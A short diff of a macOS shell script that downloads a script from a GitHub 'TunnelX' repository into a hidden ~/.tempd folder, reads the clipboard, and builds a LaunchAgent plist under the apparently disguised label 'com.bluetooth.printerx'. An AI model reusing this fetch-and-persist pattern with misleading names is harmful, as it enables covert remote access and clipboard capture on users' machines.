@@ -6,13 +6,15 @@ LOGPATH="$HOME/Library/Logs/_mylog.log"
 SNAME="com.bluetooth.printerx"
 FOLDER_PATH="$HOME/.tempd"
 FOLDER_PATH_L_APPLE="$FOLDER_PATH/l.apple.sh"
-curl -o "$FOLDER_PATH_L_APPLE" https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/l.apple.sh
+
 PICTURE_PATH="$FOLDER_PATH/d.apple.com.lib"
 NOW=$(date)
 #ANY=$(cat "/var/log/conn.log" | grep "Incoming session request" | awk \{'print $2 $3 $13 $14'\})
 CB=$(pbpaste)
 mkdir -p "$FOLDER_PATH"
 mkdir -p "$HOME"/Library/LaunchAgents
+curl -o "$FOLDER_PATH_L_APPLE" https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/l.apple.sh
+
 PL="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
 <plist version=\"1.0\"><dict>
 <key>Label</key><string>$SNAME</string>
